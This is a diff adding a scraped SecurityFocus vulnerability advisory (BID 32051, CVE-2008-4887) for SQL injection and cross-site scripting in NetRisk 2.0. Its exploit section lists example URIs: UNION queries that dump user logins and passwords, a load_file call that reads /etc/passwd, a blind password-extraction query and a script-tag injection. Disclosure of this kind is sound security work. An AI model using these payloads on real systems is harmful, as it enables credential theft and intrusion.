@@ -1,0 +1,97 @@
+#SpeeDr00t@Black Falcon<br>#bid32051<p><b><span style="font-size: 18pt;">NetRisk SQL Injection and Cross Site Scripting Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/32051/info">info</a><br><a href="http://www.securityfocus.com/bid/32051/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/32051/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/32051/solution">solution</a><br><a href="http://www.securityfocus.com/bid/32051/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				32051
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2008-4887<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Nov 02 2008 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				May 07 2015 05:21PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				StAkeR
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					NetRisk NetRisk  2.0<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	An attacker can exploit these issues via a browser. To exploit a cross-site scripting issue, the attacker must entice an unsuspecting victim to follow a malicious URI.<br/><br/>The following example URIs are available:<br/><br/>http://www.example.com/index.php?p=profile&amp;amp;id=1+union+all+select+0,0,concat(login,0x3a,password),0,0,0,0,0,0,0,0,0,0,0,0+from+netrisk_users+where+id=1/*<br/><br/>http://www.example.com/index.php?p=profile&amp;amp;id=1+union+all+select+0,0,load_file(0x2F6574632F706173737764),0,0,0,0,0,0,0,0,0,0,0,0/*<br/><br/>http://www.example.com/index.php?p=game&amp;amp;id=1 and ascii(substring((select password from netrisk_users where id=1),1,1))=ascii/*<br/><br/>http://www.example.com/index.php?error=&amp;lt;script&amp;gt;javascript&amp;lt;/script&amp;gt;
+	
+		<ul>
+</ul>
+</div>
